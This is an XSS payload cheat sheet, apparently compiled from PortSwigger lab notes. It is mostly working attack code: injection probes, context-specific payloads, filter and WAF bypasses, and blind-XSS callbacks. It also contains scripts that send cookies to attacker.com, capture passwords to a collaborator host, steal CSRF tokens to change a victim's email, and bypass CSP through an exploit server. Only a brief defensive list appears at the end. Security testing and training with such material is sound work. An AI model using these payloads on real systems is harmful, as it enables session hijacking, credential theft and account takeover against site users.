# XSS Cheatsheet

Compiled from the lab notes in the labs folder for practical PortSwigger-style XSS testing.

## 1) Find injection points

```
?q=        ?search=      ?name=       ?comment=
?msg=      ?redirect=    ?callback=   ?input=
?id=       ?data=        ?text=       ?html=
```

Also test:

- URL parameters
- Form fields
- Headers such as User-Agent and Referer
- JSON body fields
- File upload names
- Cookies
- Error messages and search boxes

## 2) Basic probes

```html
<script>
  alert(1);
</script>
">
<script>
  alert(1);
</script>
'>
<script>
  alert(1);
</script>
<img src="x" onerror="alert(1)" />
<svg onload="alert(1)">
  <body onload="alert(1)"></body>
</svg>
```

## 3) Context-based payloads

### HTML context

```html
<script>
  alert(document.domain);
</script>
<img src="x" onerror="alert(document.domain)" />
```

### Attribute context

```html
" onmouseover="alert(1) ' onfocus='alert(1)' autofocus=' "><input onfocus="alert(1)" autofocus />
```

### JavaScript string context

```javascript
';alert(1);//
</script><script>alert(1)</script>
"-alert(1)-"
a\';alert(1);//
```

### URL context

```text
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### Template literal context

```javascript
${alert(1)}
```

## 4) DOM XSS sinks to inspect

Look for these sinks in JavaScript:

- innerHTML
- outerHTML
- document.write()
- eval()
- location.href / location.hash / location.search
- setTimeout() / setInterval() with string arguments
- jQuery selectors / anchor href handling

### Examples

```text
#<img src=x onerror=alert(1)>
?search=<img src=x onerror=alert(1)>
?search=<script>alert(1)</script>
```

## 5) Reflected XSS payloads

```html
<script>
  alert(1);
</script>
<img src="x" onerror="alert(1)" />
<svg>
  <a><animate attributeName="href" values="javascript:alert(1)" /></a>
</svg>
```

## 6) Stored XSS payloads

Useful in comments, reviews, profile fields, posts, and notes:

```html
<script>
  alert(1);
</script>
<img src="x" onerror="alert(1)" />
<a href="javascript:alert(1)">click</a>
```

## 7) Attribute-based bypasses

```html
a" onfocus="alert(1)" autofocus=" " onmouseover="alert(1) javascript:alert(1)
```

## 8) Filter / WAF bypass tricks

```html
<ScRiPt>alert(1)</sCriPt>
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>
<svg%0Aonload=alert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
&#60;script&#62;alert(1)&#60;/script&#62;
<script>alert(String.fromCharCode(88,83,83))</script>
```

## 9) Custom tags / unusual markup

Some filters block normal tags but allow custom ones:

```html
<mytag id="x" onfocus="alert(document.cookie)" tabindex="0">hello</mytag>
```

## 10) SVG and event-handler bypasses

```html
<svg>
  <a>
    <animate attributeName="href" values="javascript:alert(1)" />
    <text x="20" y="20">Click me</text>
  </a>
</svg>
<svg onload="alert(1)">
  <body onresize="print()"></body>
</svg>
```

## 11) Canonical link / dangling markup style vectors

```html
<link rel="canonical" href="javascript:alert(1)" />
```

## 12) Blind XSS / external callbacks

```html
<script src=https://YOUR-ID.xss.ht></script>
<script src=https://YOUR-ID.oast.fun></script>
```

Test in:

- Contact forms
- Support tickets
- Admin panels
- Feedback forms
- Log viewers
- Order notes

## 13) Session theft / data exfiltration

```html
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
<script>
  new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie;
</script>
```

## 14) Password and token theft examples

```html
<input name="username" id="username" />
<input
  type="password"
  name="password"
  onchange="if(this.value.length)fetch('https://YOUR-COLLABORATOR-ID.oastify.com',{method:'POST',mode:'no-cors',body:username.value+':'+this.value})"
/>
```

```html
<script>
  var req = new XMLHttpRequest();
  req.onload = handleResponse;
  req.open('get', '/my-account', true);
  req.send();
  function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf=' + token + '&email=test@test.com');
  }
</script>
```

## 15) CSP bypass ideas

```html
<script>
  alert(1);
</script>
&token=;script-src-elem 'unsafe-inline'
```

```html
<body>
  <script>
    const academyFrontend = 'https://your-lab-url.net/';
    const exploitServer = 'https://your-exploit-server.net/exploit';
    const url = new URL(location);
    const csrf = url.searchParams.get('csrf');
    if (csrf) {
      const form = document.createElement('form');
      const email = document.createElement('input');
      const token = document.createElement('input');
      token.name = 'csrf';
      token.value = csrf;
      email.name = 'email';
      email.value = 'hacker@evil-user.net';
      form.method = 'post';
      form.action = `${academyFrontend}my-account/change-email`;
      form.append(email);
      form.append(token);
      document.documentElement.append(form);
      form.submit();
    } else {
      location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
    }
  </script>
</body>
```

## 16) Quick wins

```text
Search box               → Reflected XSS
Comment / review section → Stored XSS
URL fragment (#)         → DOM XSS
Profile name / bio field → Stored XSS
Error messages           → Reflected XSS
File upload (SVG/HTML)   → Stored XSS via file
```

## 17) Defensive reminder

- Prefer text-based rendering with textContent instead of innerHTML
- Sanitize and encode untrusted input
- Avoid inline event handlers
- Use a strict CSP and DOMPurify when rendering user-controlled HTML
